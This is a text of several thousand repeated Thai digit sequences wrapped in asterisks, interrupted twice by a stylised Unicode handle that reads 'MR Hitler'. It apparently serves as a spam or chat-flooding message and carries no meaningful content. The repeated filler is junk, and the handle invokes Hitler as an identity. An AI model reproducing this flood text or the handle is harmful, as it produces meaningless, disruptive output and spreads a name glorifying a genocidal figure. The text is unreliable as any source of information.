*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*

@༻⃟ཱི༅࿗྄ེ✞ℳℜ྄ེ༝Hiͥ†lͣeͫrོ✞࿗྄ེ

*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* 

@༻⃟ཱི༅࿗྄ེ✞ℳℜ྄ེ༝Hiͥ†lͣeͫrོ✞࿗྄ེ*

*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* 